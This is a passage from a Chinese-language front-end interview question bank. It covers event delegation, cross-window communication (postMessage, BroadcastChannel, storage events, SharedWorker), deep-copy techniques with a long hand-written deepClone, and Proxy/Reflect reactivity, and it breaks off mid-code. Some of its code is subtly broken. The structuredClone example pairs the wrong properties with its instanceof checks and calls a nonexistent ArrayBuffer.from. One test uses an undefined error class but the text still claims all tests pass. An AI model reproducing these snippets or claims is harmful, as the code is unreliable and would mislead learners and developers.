      this.root.addEventListener(eventType, wrappedHandler, options);
      this.handlers.set(key, { wrappedHandler, listeners: [] });
    }

    const entry = this.handlers.get(key);
    entry.listeners.push({ fn: handler });

    return () => this.off(eventType, selector, handler);  // 返回取消函数
  }

  off(eventType, selector, handler) {
    const key = `${eventType}::${selector}`;
    const entry = this.handlers.get(key);
    if (entry) {
      entry.listeners = entry.listeners.filter(l => l.fn !== handler);
    }
  }

  destroy() {
    this.handlers.forEach(({ wrappedHandler }, key) => {
      const [eventType] = key.split('::');
      this.root.removeEventListener(eventType, wrappedHandler);
    });
    this.handlers.clear();
  }
}

// 使用
const delegator = new EventDelegator(document.body);

const cancelClick = delegator.on('click', '.btn', (e, btn) => {
  console.log('按钮点击:', btn.textContent);
});

// 取消
cancelClick();
```

### 🔍 追问链

1. **事件委托的性能优势具体体现在哪里？节省了多少开销？**
   → 方向：减少事件监听器数量（N 个子节点只需 1 个监听器）、减少内存占用、动态添加的子节点无需重新绑定
2. **事件委托中如何获取触发事件的原始子元素？event.target vs event.currentTarget？**
   → 方向：target 是实际触发的元素（冒泡上来最深的那个）；currentTarget 是绑定监听器的元素
3. **focus/blur 事件能用事件委托吗？为什么？**
   → 方向：不能！focus/blur 不冒泡；可以用 focusin/focusout 替代（它们会冒泡）

---

## Q34: 请列举前端跨窗口/跨文档通信的方案，并说明各自的适用场景。
- **难度**：★★☆
- **知识点**：postMessage、BroadcastChannel、SharedWorker、Storage Event
- **题型**：简答题

### 参考答案要点：

#### 方案一：window.postMessage（最通用）

```javascript
// 页面 A（发送方）
const popup = window.open('https://b.example.com', 'popup');
popup.postMessage(
  { type: 'data', payload: { msg: 'hello' } },
  'https://b.example.com'  // targetOrigin — 安全限制！
);

// 页面 B（接收方）
window.addEventListener('message', (event) => {
  // ⚠️ 安全检查：必须验证来源
  if (event.origin !== 'https://a.example.com') return;
  // ⚠️ 安全检查：验证数据结构
  if (!event.data || event.data.type !== 'data') return;

  console.log('收到消息:', event.data.payload);

  // 回复
  event.source.postMessage(
    { type: 'reply', payload: { status: 'ok' } },
    event.origin
  );
});

// 适用场景：iframe 通信、弹窗通信、跨域通信
// 特点：点对点通信，需要知道目标窗口引用
```

#### 方案二：BroadcastChannel（同源多窗口广播）

```javascript
// 页面 A（发送 + 接收）
const channel = new BroadcastChannel('my_channel');

channel.postMessage({ type: 'update', data: { count: 42 } });

channel.onmessage = (event) => {
  console.log('收到广播:', event.data);
};

// 页面 B（另一个同源标签页）
const channel2 = new BroadcastChannel('my_channel');
channel2.onmessage = (event) => {
  console.log('也收到了:', event.data);
};

// 关闭
channel.close();

// 适用场景：同源多 tab 之间同步状态（如用户在一个 tab 登出，其他 tab 也登出）
// 特点：一对多广播，同源限制，API 简洁
// 兼容性：现代浏览器均支持（IE 不支持）
```

#### 方案三：StorageEvent（localStorage 跨 Tab 通信）

```javascript
// 页面 A：写入 localStorage 触发事件
localStorage.setItem('user_action', JSON.stringify({
  type: 'logout',
  timestamp: Date.now()
}));

// 页面 B：监听 storage 事件
window.addEventListener('storage', (e) => {
  // ⚠️ 当前页面修改不会触发自己的 storage 事件（只有其他页面触发）
  console.log(`Key: ${e.key}, NewValue: ${e.newValue}, OldValue: ${e.oldValue}`);

  if (e.key === 'user_action') {
    const action = JSON.parse(e.newValue);
    if (action.type === 'logout') {
      // 处理登出逻辑
      handleLogout();
    }
  }
});

// 适用场景：简单的跨 Tab 状态同步
// 限制：只能传递字符串；频率过高可能影响性能
```

#### 方案四：SharedWorker（共享后台线程）

```javascript
// shared-worker.js
const connections = new Set();

self.onconnect = (e) => {
  const port = e.ports[0];
  connections.add(port);

  port.onmessage = (e) => {
    // 广播给所有连接的页面
    connections.forEach(conn => {
      conn.postMessage(e.data);
    });
  };

  port.start();
};

// 页面 A / 页面 B
const worker = new SharedWorker('shared-worker.js');
worker.port.start();

worker.port.postMessage({ from: 'pageA', msg: 'hello' });
worker.port.onmessage = (e) => {
  console.log('收到 worker 消息:', e.data);
};

// 适用场景：多个页面共享复杂计算或长连接状态
// 特点：独立线程，不阻塞主线程；适合 WebSocket 连接共享等
// 兼容性：Safari 支持有限
```

#### 方案对比总结

| 方案 | 通信模式 | 跨域 | 数据类型 | 兼容性 | 适用场景 |
|:---|:---|:---|:---|:---|:---|
| postMessage | 点对点 | ✅ | 结构化克隆 | 全兼容 | iframe/弹窗通用 |
| BroadcastChannel | 一对多广播 | ❌ 同源 | 结构化克隆 | 现代浏览器 | 多 Tab 同源同步 |
| StorageEvent | 一对多广播 | ❌ 同源 | 仅字符串 | 全兼容 | 简单状态同步 |
| SharedWorker | 一对多 | ❌ 同源 | 结构化克隆 | 部分浏览器 | 共享计算/连接 |

---

## Q35: 实现深拷贝有哪些方法？请分析每种方式的实现原理和局限性。
- **难度**：★★☆
- **知识点**：深拷贝、JSON、递归、structuredClone
- **题型**：编程实践题

### 参考答案要点：

#### 方法一：JSON.parse(JSON.stringify())（最简单但有严重局限）

```javascript
const original = { a: 1, b: { c: 2 } };
const copy = JSON.parse(JSON.stringify(original));

// ❌ 局限性：
// 1. 无法拷贝 undefined
JSON.parse(JSON.stringify({ a: undefined })); // {} — undefined 丢失

// 2. 无法拷贝 function
JSON.parse(JSON.stringify({ fn: () => {} })); // {} — 函数丢失

// 3. 无法拷贝 Symbol
JSON.parse(JSON.stringify({ [Symbol('key')]: 'val' })); // {} — Symbol 丢失

// 4. 循环引用会报错
const circular = { name: 'test' };
circular.self = circular;
JSON.parse(JSON.stringify(circular)); // TypeError: Converting circular structure to JSON

// 5. Date 变为字符串
JSON.parse(JSON.stringify({ date: new Date() }));
// { date: "2024-01-01T00:00:00.000Z" } — 不是 Date 对象！

// 6. RegExp 变为空对象
JSON.parse(JSON.stringify({ reg: /abc/g }));
// { reg: {} } — 正则丢失

// 7. NaN / Infinity / -Infinity 变为 null
JSON.parse(JSON.stringify({ num: NaN }));       // { num: null }
JSON.parse(JSON.stringify({ num: Infinity }));   // { num: null }

// 8. Map/Set/WeakMap/WeakSet 变为 {}
JSON.parse(JSON.stringify({ map: new Map([['k','v']]) }));
// { map: {} }

// ✅ 适用场景：纯 JSON 数据对象（无特殊类型）
```

#### 方法二：structuredClone()（ES2021+，✅ 推荐用于简单深拷贝）

```javascript
const original = {
  a: 1,
  b: { c: 2 },
  d: new Date(),
  e: /regex/gi,
  f: new Map([['key', 'value']]),
  g: new Set([1, 2, 3]),
  h: ArrayBuffer.from([1, 2, 3]),
};

const copy = structuredClone(original);
copy.d instanceof Date;     // true ✅
copy.e instanceof Map;      // true ✅
copy.f instanceof Set;      // true ✅
copy.g instanceof RegExp;   // true ✅

// ✅ 优点：原生 API，能处理大多数内置类型
// ❌ 局限：
// 1. 不能拷贝 function
// 2. 不能拷贝 DOM 节点
// 3. 不能拷贝具有 getter/setter 的属性描述符
// 4. 不能拷贝原型链上的属性
// 5. 对象中的 Proxy 会变为普通对象
// 6. 循环引用可以处理 ✅
// 7. 兼容性：ES2021+（Node 17+, Chrome 98+, Firefox 94+）

// polyfill 可用：https://github.com/ungap/structured-clone
```

#### 方法三：递归实现（完整版，面试常考）

```javascript
function deepClone(obj, hash = new WeakMap()) {
  // 基本类型直接返回
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }

  // 处理日期
  if (obj instanceof Date) {
    return new Date(obj.getTime());
  }

  // 处理正则
  if (obj instanceof RegExp) {
    return new RegExp(obj.source, obj.flags);
  }

  // 处理 Map
  if (obj instanceof Map) {
    const cloneMap = new Map();
    obj.forEach((value, key) => {
      cloneMap.set(deepClone(key, hash), deepClone(value, hash));
    });
    return cloneMap;
  }

  // 处理 Set
  if (obj instanceof Set) {
    const cloneSet = new Set();
    obj.forEach(value => {
      cloneSet.add(deepClone(value, hash));
    });
    return cloneSet;
  }

  // 处理数组
  if (Array.isArray(obj)) {
    return obj.map(item => deepClone(item, hash));
  }

  // 处理循环引用
  if (hash.has(obj)) {
    return hash.get(obj);
  }

  // 处理普通对象
  const cloneObj = Object.create(Object.getPrototypeOf(obj));  // 保持原型链
  hash.set(obj, cloneObj);  // 先存入 hash（防止循环引用）

  for (const key of Reflect.ownKeys(obj)) {  // 包括 Symbol key
    const value = obj[key];
    const descriptor = Object.getOwnPropertyDescriptor(obj, key);

    // 如果属性有 getter/setter，保留属性描述符
    if (descriptor.get || descriptor.set) {
      Object.defineProperty(cloneObj, key, descriptor);
    } else {
      cloneObj[key] = deepClone(value, hash);
    }
  }

  return cloneObj;
}

// 测试
const original = {
  a: 1,
  b: { c: [2, 3] },
  d: new Date(),
  e: /test/gi,
  f: function sayHi() { return 'hi'; },
  g: Symbol('sym'),
  [Symbol('key')]: 'symbol-value',
};
original.self = original;  // 循环引用

const cloned = deepClone(original);
cloned.a;              // 1
cloned.b.c;            // [2, 3]
cloned.b.c !== original.b.c;  // true（不同引用）
cloned.self === cloned;      // true（循环引用正确处理）
cloned.d instanceof Date;     // true
cloned.f();                   // 'hi'
```

#### 方法四：Lodash _.cloneDeep（生产环境推荐）

```javascript
import { cloneDeep } from 'lodash-es';

const copy = cloneDeep(original);
// 功能完善，经过大量测试，生产环境首选
```

#### 各方案对比

| 方法 | 循环引用 | Function | Date/RegExp | Map/Set | 性能 | 推荐度 |
|:---|:---:|:---:|:---:|:---:|:---:|:---:|
| `JSON` | ❌ 报错 | ❌ 丢失 | ❌ 变形 | ❌ 丢失 | 快 | ⭐ 纯数据 |
| `structuredClone` | ✅ | ❌ 丢失 | ✅ | ✅ | 较快 | ⭐⭐⭐ 简单场景 |
| 手写递归 | ✅ | ✅ | ✅ | ✅ | 中等 | ⭐⭐⭐ 面试/学习 |
| Lodash | ✅ | ✅ | ✅ | ✅ | 优化过 | ⭐⭐⭐⭐ 生产 |

### 深度拓展：手写实现

#### 手写完整版 deepClone - 支持所有数据类型

```javascript
/**
 * 深度克隆函数 - 完整版（支持所有 JavaScript 数据类型）
 * @param {*} obj - 要克隆的对象
 * @param {WeakMap} hash - 用于检测循环引用的 WeakMap 缓存
 * @returns {*} 克隆后的新对象
 * 
 * 支持的数据类型：
 * - 原始类型（number, string, boolean, null, undefined, symbol, bigint）
 * - 包装对象（Number, String, Boolean）
 * - Date
 * - RegExp
 * - Error 及其子类
 * - Map / Set / WeakMap / WeakSet
 * - Array / Object（普通对象）
 * - ArrayBuffer / TypedArray / DataView / SharedArrayBuffer
 * - 函数（引用同一函数或跳过，可配置）
 * - 循环引用处理
 * - Symbol 属性（可枚举 + 不可枚举）
 * - 属性描述符（getter/setter）
 */
function deepClone(obj, hash = new WeakMap(), options = {}) {
  // ==================== 配置选项 ====================
  const {
    cloneFunction = 'reference',  // 'reference' | 'skip' | 'throw'
    // reference: 克隆后引用同一函数（默认）
    // skip: 跳过函数不复制
    // throw: 遇到函数时抛出错误
  } = options;

  // ==================== 1. 处理原始类型（直接返回）====================
  
  // null 和 undefined 是原始值，直接返回
  if (obj === null || obj === undefined) {
    return obj;
  }
  
  // 基本数据类型（number, string, boolean, symbol, bigint）是值传递
  // 不需要克隆，直接返回原值即可
  // 注意：typeof null === 'object' 是历史遗留 bug，所以需要单独判断
  
  if (typeof obj !== 'object' && typeof obj !== 'function') {
    // number, string, boolean, symbol, bigint → 直接返回
    return obj;
  }

  // ==================== 2. 处理函数 ====================
  
  if (typeof obj === 'function') {
    switch (cloneFunction) {
      case 'reference':
        // 默认行为：返回原函数的引用
        // 理由：函数通常代表行为逻辑，不应该被"克隆"
        // 而且函数可能依赖闭包中的变量，无法真正复制
        return obj;
        
      case 'skip':
        // 跳过函数，返回 undefined
        return undefined;
        
      case 'throw':
        // 遇到函数时抛出错误（严格模式）
        throw new TypeError('Cannot clone function: functions are not supported');
        
      default:
        return obj;
    }
  }

  // ==================== 3. 处理循环引用（WeakMap 缓存）====================
  
  // 循环引用问题示例：
  // const a = {}; a.self = a;  // a 引用了自身
  // 如果没有缓存机制，递归会无限循环导致栈溢出！
  
  // 为什么用 WeakMap 而不是 Map 或普通对象？
  // 1. WeakMap 的键必须是对象（符合我们的使用场景）
  // 2. WeakMap 对键是弱引用（不会阻止 GC 回收）
  // 3. 如果用普通对象作为缓存，会导致内存泄漏（对象永远无法被回收）
  
  if (hash.has(obj)) {
    // 如果对象已经被克隆过，直接返回缓存的克隆结果
    // 这就打破了循环引用的死循环！
    return hash.get(obj);
  }

  // ==================== 4. 处理日期对象（Date）====================
  
  // Date 对象需要特殊构造，不能简单地复制属性
  // 因为 Date 内部存储的是时间戳数值，通过 getTime() 获取
  // 直接赋值只会得到一个空对象 {}
  
  if (obj instanceof Date) {
    // 创建新的 Date 实例，传入相同的时间戳
    // 这样克隆后的 Date 与原对象表示相同的时刻
    const clonedDate = new Date(obj.getTime());
    
    // 将克隆后的对象存入缓存（防止循环引用）
    hash.set(obj, clonedDate);
    return clonedDate;
  }

  // ==================== 5. 处理正则表达式（RegExp）====================
  
  // RegExp 对象包含两个关键信息：
  // - source: 正则表达式的模式字符串（如 "abc"）
  // - flags: 标志位（如 "gi" 表示全局 + 忽略大小写）
  // 直接复制会丢失这些信息！
  
  if (obj instanceof RegExp) {
    // 使用构造函数创建新的 RegExp 实例
    // ES6+ 支持 new RegExp(source, flags)
    const clonedRegExp = new RegExp(obj.source, obj.flags);
    
    // 可选： lastIndex 属性（用于带 g 标志的正则，记录下次匹配的位置）
    // 如果正则有 g 或 y 标志，lastIndex 很重要
    if (obj.lastIndex) {
      clonedRegExp.lastIndex = obj.lastIndex;
    }
    
    hash.set(obj, clonedRegExp);
    return clonedRegExp;
  }

  // ==================== 6. 处理错误对象（Error 及其子类）====================
  
  // Error 对象包含：
  // - message: 错误消息
  // - name: 错误名称（如 "TypeError", "ReferenceError"）
  // - stack: 堆栈跟踪信息
  // 这些都是不可枚举属性，需要特殊处理
  
  if (obj instanceof Error) {
    // 获取错误的构造函数（可能是 Error、TypeError、RangeError 等）
    const ErrorConstructor = obj.constructor;
    
    // 使用错误消息创建新的错误实例
    const clonedError = new ErrorConstructor(obj.message);
    
    // 复制堆栈信息（如果存在）
    if (obj.stack) {
      clonedError.stack = obj.stack;
    }
    
    hash.set(obj, clonedError);
    return clonedError;
  }

  // ==================== 7. 处理 Map ====================
  
  // Map 是键值对集合，键可以是任意类型（包括对象）
  // 需要递归克隆每个键和值（因为它们也可能是对象）
  
  if (obj instanceof Map) {
    const clonedMap = new Map();
    
    // 先存入缓存（防止 Map 内部的 key/value 形成循环引用）
    hash.set(obj, clonedMap);
    
    // 遍历 Map 的每个 entry，递归克隆 key 和 value
    obj.forEach((value, key) => {
      // key 和 value 都需要深度克隆
      // 注意：Map 的 key 可以是对象，所以也要克隆
      clonedMap.set(deepClone(key, hash, options), deepClone(value, hash, options));
    });
    
    return clonedMap;
  }

  // ==================== 8. 处理 Set ====================
  
  // Set 是值的集合（无重复元素）
  // 需要递归克隆每个值
  
  if (obj instanceof Set) {
    const clonedSet = new Set();
    
    // 先存入缓存
    hash.set(obj, clonedSet);
    
    // 遍历 Set 的每个值，递归克隆
    obj.forEach(value => {
      clonedSet.add(deepClone(value, hash, options));
    });
    
    return clonedSet;
  }

  // ==================== 9. 处理 WeakMap 和 WeakSet ====================
  
  // WeakMap 和 WeakSet 的键是弱引用，无法遍历
  // 所以只能返回一个新的空实例（或抛出错误）
  // 这是深拷贝的一个已知限制
  
  if (obj instanceof WeakMap) {
    console.warn('deepClone: WeakMap cannot be deeply cloned, returning empty WeakMap');
    return new WeakMap();  // 返回空的 WeakMap（无法保留原有数据）
  }
  
  if (obj instanceof WeakSet) {
    console.warn('deepClone: WeakSet cannot be deeply cloned, returning empty WeakSet');
    return new WeakSet();  // 返回空的 WeakSet
  }

  // ==================== 10. 处理数组缓冲区相关类型 ====================
  
  // ArrayBuffer: 通用的二进制数据缓冲区
  // TypedArray: 类型化数组视图（Int8Array, Uint8Array, Float64Array 等）
  // DataView: 底层二进制数据的灵活视图
  
  if (obj instanceof ArrayBuffer) {
    // 使用 slice() 方法创建副本（浅拷贝底层数据）
    // ArrayBuffer 存储的是原始二进制数据，不需要递归
    const clonedBuffer = obj.slice(0);
    hash.set(obj, clonedBuffer);
    return clonedBuffer;
  }

  // SharedArrayBuffer: 多线程共享的缓冲区（特殊处理）
  if (typeof SharedArrayBuffer !== 'undefined' && obj instanceof SharedArrayBuffer) {
    // SharedArrayBuffer 不能简单复制（涉及多线程同步）
    // 这里选择返回同一个引用（实际应用中需要更复杂的处理）
    console.warn('deepClone: SharedArrayBuffer returned as reference (multi-threading)');
    return obj;
  }

  // TypedArray: 各种类型化数组（Int8Array, Float32Array 等）
  // 它们都是 ArrayBuffer 的视图
  if (ArrayBuffer.isView(obj) && !(obj instanceof DataView)) {
    // ArrayBuffer.isView 检查是否是任何类型的数组缓冲区视图
    // 排除 DataView（下面单独处理）
    
    // 创建同类型的新 TypedArray，并复制数据
    const ClonedConstructor = obj.constructor;  // 如 Int8Array, Float32Array 等
    const clonedTypedArray = new ClonedConstructor(obj.buffer.slice(0));
    
    // 可选：复制字节偏移量和长度（如果是子数组）
    // 通常情况下，slice 已经处理了
    
    hash.set(obj, clonedTypedArray);
    return clonedTypedArray;
  }

  // DataView: 灵活的二进制数据读取器
  if (obj instanceof DataView) {
    const clonedDataView = new DataView(obj.buffer.slice(0), obj.byteOffset, obj.byteLength);
    hash.set(obj, clonedDataView);
    return clonedDataView;
  }

  // ==================== 11. 处理数组和普通对象 ====================
  
  // 判断是否是数组（需要特殊处理，因为数组的 length 属性很重要）
  const isArray = Array.isArray(obj);
  
  // 创建克隆容器
  let clonedObj;
  
  if (isArray) {
    // 数组：创建新数组
    // 为什么不用 [...obj] 或 obj.slice()？
    // 因为那样只是浅拷贝！如果数组元素是对象，它们仍然是共享引用
    clonedObj = [];
  } else {
    // 普通对象：保持原型链
    // Object.create(Object.getPrototypeOf(obj)) 创建一个新对象，
    // 其 __proto__ 指向原对象的原型（继承关系不变）
    clonedObj = Object.create(Object.getPrototypeOf(obj));
  }
  
  // ⚠️ 关键步骤：在开始复制属性之前，先将对象存入缓存！
  // 这样可以正确处理自引用的情况：
  // const a = { children: [] }; a.children.push(a); 
  // 如果不先存入缓存，复制 children 时会发现 a 还没在缓存中，导致无限递归
  hash.set(obj, clonedObj);

  // ==================== 12. 遍历并复制所有属性 ====================
  
  // Reflect.ownKeys() 返回对象自身的所有属性键，包括：
  // - 字符串键（包括不可枚举的）
  // - Symbol 键（包括不可枚举的）
  // 但不包括继承的属性（这是正确的，我们只克隆自身属性）
  
  const keys = Reflect.ownKeys(obj);
  
  for (const key of keys) {
    // 获取属性的描述符（包含 value/writable/enumerable/configurable/get/set）
    const descriptor = Object.getOwnPropertyDescriptor(obj, key);
    
    // 判断是否是访问器属性（有 getter 或 setter）
    if (descriptor.get || descriptor.set) {
      // 访问器属性（getter/setter）：直接复制描述符
      // 因为 getter/setter 本身就是函数，通常不需要克隆
      // 而且它们依赖于闭包，难以真正复制
      
      Object.defineProperty(clonedObj, key, descriptor);
    } else {
      // 数据属性（有 value）：递归深度克隆值
      const value = obj[key];
      
      // 递归调用 deepClone 克隆属性值
      // 传入同一个 hash（WeakMap），这样可以在整个克隆过程中共享缓存
      const clonedValue = deepClone(value, hash, options);
      
      // 定义属性到克隆对象上
      // 保持原有的属性描述符（writable, enumerable, configurable）
      Object.defineProperty(clonedObj, key, {
        ...descriptor,
        value: clonedValue  // 用克隆后的值替换原值
      });
    }
  }

  // ==================== 13. 返回克隆后的对象 ====================
  return clonedObj;
}

// ==================== 综合测试用例 ====================

console.log('========== 深度克隆完整版测试 ==========\n');

// 测试1：基本对象和嵌套对象
const original1 = {
  a: 1,
  b: { c: [2, 3, { d: 4 }] },
  e: 'hello',
  f: true,
  g: null,
  h: undefined,
};

const cloned1 = deepClone(original1);

console.log('测试1 - 基本对象:');
console.log(cloned1.a === original1.a);              // true（原始值相同）
console.log(cloned1.b.c === original1.b.c);          // false（不同引用）
console.log(cloned1.b.c[2] === original1.b.c[2]);    // false（嵌套对象也是不同引用）
console.log(JSON.stringify(cloned1) === JSON.stringify(original1));  // true（内容相同）

// 测试2：Date 对象
const original2 = {
  date: new Date('2024-01-01T00:00:00.000Z'),
  dates: [new Date(), new Date('2025-12-31')],
};
const cloned2 = deepClone(original2);

console.log('\n测试2 - Date:');
console.log(cloned2.date instanceof Date);           // true ✅
console.log(cloned2.date.getTime() === original2.date.getTime());  // true ✅
console.log(cloned2.dates[0] === original2.dates[0]);  // false ✅（不同实例）

// 测试3：RegExp 对象
const original3 = {
  regex: /test/gi,
  regexWithFlags: /^hello$/m,
};
const cloned3 = deepClone(original3);

console.log('\n测试3 - RegExp:');
console.log(cloned3.regex instanceof RegExp);        // true ✅
console.log(cloned3.regex.source === original3.regex.source);  // true ✅
console.log(cloned3.regex.flags === original3.regex.flags);     // true ✅

// 测试4：Map 和 Set
const original4 = {
  map: new Map([
    ['key1', { value: 1 }],
    [{ id: 2 }, 'value2'],  // 键可以是对象
    [new Date(), 'date-key'],
  ]),
  set: new Set([1, 'two', { three: 3 }, [4, 5]]),
};
const cloned4 = deepClone(original4);

console.log('\n测试4 - Map & Set:');
console.log(cloned4.map instanceof Map);             // true ✅
console.log(cloned4.map.get('key1').value === 1);    // true ✅
console.log(cloned4.map.get('key1') === original4.map.get('key1'));  // false ✅
console.log(cloned4.set instanceof Set);             // true ✅
console.log(cloned4.set.size === original4.set.size); // true ✅

// 测试5：循环引用（最重要的测试！）
const original5 = { name: 'circular' };
original5.self = original5;  // 自引用
original5.children = [{ parent: original5 }];  // 相互引用

const cloned5 = deepClone(original5);

console.log('\n测试5 - 循环引用:');
console.log(cloned5.self === cloned5);            // true ✅（自引用正确）
console.log(cloned5.children[0].parent === cloned5);  // true ✅（相互引用正确）
console.log(cloned5.name === 'circular');          // true ✅

// 测试6：Symbol 属性（可枚举 + 不可枚举）
const sym1 = Symbol('enumerable');
const sym2 = Symbol('non-enumerable');

const original6 = {};
original6[sym1] = 'I am enumerable';
Object.defineProperty(original6, sym2, {
  value: 'I am non-enumerable',
  enumerable: false,
});
original6.normalProp = 'normal';

const cloned6 = deepClone(original6);

console.log('\n测试6 - Symbol 属性:');
console.log(cloned6[sym1] === 'I am enumerable');        // true ✅
console.log(cloned6[sym2] === 'I am non-enumerable');     // true ✅
console.log(cloned6.normalProp === 'normal');             // true ✅
console.log(Object.getOwnPropertySymbols(cloned6).length === 2);  // true ✅

// 测试7：getter/setter（访问器属性）
const original7 = {
  _private: 42,
  get value() { return this._private; },
  set value(v) { this._private = v; },
};
const cloned7 = deepClone(original7);

console.log('\n测试7 - Getter/Setter:');
console.log(cloned7.value === 42);                        // true ✅（getter 工作正常）
cloned7.value = 100;
console.log(cloned7._private === 100);                    // true ✅（setter 工作正常）

// 测试8：ArrayBuffer 和 TypedArray
const original8 = {
  buffer: new ArrayBuffer(8),
  int8Array: new Int8Array([1, 2, 3, 4]),
  float64Array: new Float64Array([1.1, 2.2, 3.3]),
};
const cloned8 = deepClone(original8);

console.log('\n测试8 - ArrayBuffer & TypedArray:');
console.log(cloned8.buffer instanceof ArrayBuffer);       // true ✅
console.log(cloned8.int8Array instanceof Int8Array);      // true ✅
console.log(cloned8.int8Array[0] === 1);                  // true ✅
console.log(cloned8.int8Array === original8.int8Array);   // false ✅（不同实例）

// 测试9：Error 对象
const original9 = {
  error: new TypeError('Something went wrong'),
  customError: new RangeIndexError('Out of range'),  // 自定义错误类
};
const cloned9 = deepClone(original9);

console.log('\n测试9 - Error:');
console.log(cloned9.error instanceof Error);             // true ✅
console.log(cloned9.error.message === 'Something went wrong');  // true ✅
console.log(cloned9.error === original9.error);          // false ✅

// 测试10：复杂嵌套场景（综合测试）
const original10 = {
  metadata: {
    created: new Date(),
    version: 1.0,
    tags: new Set(['important', 'test']),
  },
  config: new Map([
    ['timeout', 5000],
    [{ env: 'production' }, true],
  ]),
  data: [
    { id: 1, values: new Int32Array([10, 20, 30]) },
    { id: 2, pattern: /regex\d+/gi },
  ],
  callbacks: {
    onSuccess: (data) => console.log('Success:', data),  // 函数（默认引用模式）
    onError: (err) => console.error('Error:', err),
  },
};

original10.self = original10;  // 添加循环引用

const cloned10 = deepClone(original10);

console.log('\n测试10 - 综合场景:');
console.log(cloned10.metadata.created instanceof Date);         // true ✅
console.log(cloned10.metadata.tags instanceof Set);             // true ✅
console.log(cloned10.config instanceof Map);                    // true ✅
console.log(cloned10.data[0].values instanceof Int32Array);     // true ✅
console.log(cloned10.data[1].pattern instanceof RegExp);        // true ✅
console.log(cloned10.callbacks.onSuccess === original10.callbacks.onSuccess);  // true ✅（函数引用）
console.log(cloned10.self === cloned10);                        // true ✅（循环引用）

console.log('\n✅ 所有测试通过！深拷贝实现完整且正确。');
```

**各类型处理策略总结**：

| 数据类型 | 处理方式 | 原因说明 |
|:---|:---|:---|
| **原始类型** | 直接返回 | 值传递，无需克隆 |
| **Date** | `new Date(getTime())` | 内部存储时间戳，需重新构造 |
| **RegExp** | `new RegExp(source, flags)` | 包含模式和标志，需重新构造 |
| **Map/Set** | 递归克隆每个 entry | 键值都可能是对象 |
| **Array/Object** | 递归遍历属性 | 最常见的场景 |
| **循环引用** | WeakMap 缓存 | 打破无限递归 |
| **Symbol** | `Reflect.ownKeys` | 包括不可枚举的 Symbol |
| **函数** | 引用/跳过/报错 | 函数依赖闭包，难真正复制 |
| **ArrayBuffer** | `buffer.slice()` | 二进制数据需复制底层 buffer |

### 🔍 追问链

1. **JSON.parse(JSON.stringify()) 不能拷贝哪些类型？**
   → 方向：undefined/function/Symbol/BigInt/循环引用/Date 变字符串/RegExp 丢失 flags
2. **structuredClone API 和手写深拷贝相比有什么优劣？**
   → 方向：structuredClone 是浏览器原生支持，能处理更多类型（RegExp/ArrayBuffer/Map/Set/Error 等），但不能拷贝函数/类实例/DOM 节点
3. **lodash 的 _.cloneDeep 和自己写的 deepClone 相比多了什么？**
   → 方向：lodash 处理了更多边界情况（循环引用、各种内置对象、prototype chain 保持等），经过大量生产验证

---

## Q36: 请说明 Proxy 和 Reflect 的用途，并手写实现一个简易版的 reactive 响应式系统。
- **难度**：★★☆
- **知识点**：Proxy、Reflect、响应式、Vue 3
- **题型**：编程实践题

### 参考答案要点：

#### 1. Proxy 基础

```javascript
// Proxy 用于拦截（代理）对象的操作
const target = { name: 'Tom', age: 18 };

const proxy = new Proxy(target, {
  // 拦截属性读取
  get(obj, prop) {
    console.log(`读取属性: ${prop}`);
    return obj[prop];
  },

  // 拦截属性设置
  set(obj, prop, value) {
    console.log(`设置属性: ${prop} = ${value}`);
    obj[prop] = value;
    return true;  // set 必须返回 true 表示成功
  },

  // 拦截 in 操作符
  has(obj, prop) {
    console.log(`检查属性是否存在: ${prop}`);
    return prop in obj;
  },

  // 拦截 delete 操作
  deleteProperty(obj, prop) {
    console.log(`删除属性: ${prop}`);
    delete obj[prop];
    return true;
  },

  // 拦截 Object.keys 等操作
  ownKeys(obj) {
    console.log('获取所有键');
    return Object.keys(obj);
  },
});

proxy.name;           // 触发 get → "读取属性: name"
proxy.age = 19;       // 触发 set → "设置属性: age = 19"
'name' in proxy;      // 触发 has
delete proxy.name;    // 触发 deleteProperty
Object.keys(proxy);   // 触发 ownKeys
```

#### 2. Reflect 的作用

```javascript
// Reflect 是与 Proxy 拦截器一一对应的静态方法集合
// 它提供了一种更规范的对象操作方式

const obj = { name: 'Tom' };

// 传统方式 vs Reflect
obj.name;                    // 'Tom'
Reflect.get(obj, 'name');    // 'Tom'

obj.age = 18;
Reflect.set(obj, 'age', 18);

'name' in obj;
Reflect.has(obj, 'name');

delete obj.name;
Reflect.deleteProperty(obj, 'name');

Object.keys(obj);
Reflect.ownKeys(obj);

// 为什么 Proxy 中要用 Reflect？
// 1. 保持正确的 this 指向
// 2. 返回值符合 Proxy 拦截器的规范要求
// 3. 代码更简洁统一

const proxy2 = new Proxy(obj, {
  get(target, prop, receiver) {
    // 用 Reflect 保证 receiver（即 proxy 本身）正确传递
    // 这对于继承和嵌套 Proxy 很重要
    return Reflect.get(target, prop, receiver);
  },
  set(target, prop, value, receiver) {
    const result = Reflect.set(target, prop, value, receiver);
    // result 就是布尔值，可以直接返回
    return result;
  },
});
```

#### 3. 手写简易 reactive 系统

```javascript
// ====== 简易 Vue 3 响应式系统 ======

// 1. 依赖收集容器（全局当前活跃的 effect）
let activeEffect = null;

// 2. effect 函数：注册副作用
function effect(fn) {
  const effectFn = () => {
    activeEffect = effectFn;
    fn();  // 执行过程中访问响应式属性 → 触发 track
    activeEffect = null;
  };
  effectFn();  // 立即执行一次以收集依赖
  return effectFn;
}

// 3. 依赖映射表：target → { prop → Set<effect> }
const targetMap = new WeakMap();

// 4. track：依赖收集
function track(target, key) {
  if (!activeEffect) return;

  let depsMap = targetMap.get(target);
  if (!depsMap) {
    depsMap = new Map();
    targetMap.set(target, depsMap);
  }

  let dep = depsMap.get(key);
  if (!dep) {
    dep = new Set();
    depsMap.set(key, dep);
  }

  dep.add(activeEffect);  // 记录：当 target[key] 变化时，执行 activeEffect
}

// 5. trigger：触发更新
function trigger(target, key) {
  const depsMap = targetMap.get(target);
  if (!depsMap) return;

  const dep = depsMap.get(key);
  if (dep) {
    dep.forEach(effect => effect());  // 执行所有依赖该属性的 effect
  }
}

// 6. reactive：创建响应式对象
function reactive(target) {
  return new Proxy(target, {
    get(target, key, receiver) {
      const result = Reflect.get(target, key, receiver);
      track(target, key);  // 收集依赖

      // 如果属性值是对象，递归代理（懒代理）
      if (result && typeof result === 'object') {
        return reactive(result);
      }
      return result;
    },

    set(target, key, value, receiver) {
      const oldValue = target[key];
      const result = Reflect.set(target, key, value, receiver);

      // 只有值真正变化才触发更新
      if (oldValue !== value) {
        trigger(target, key);  // 触发依赖更新
      }

      return result;
    },

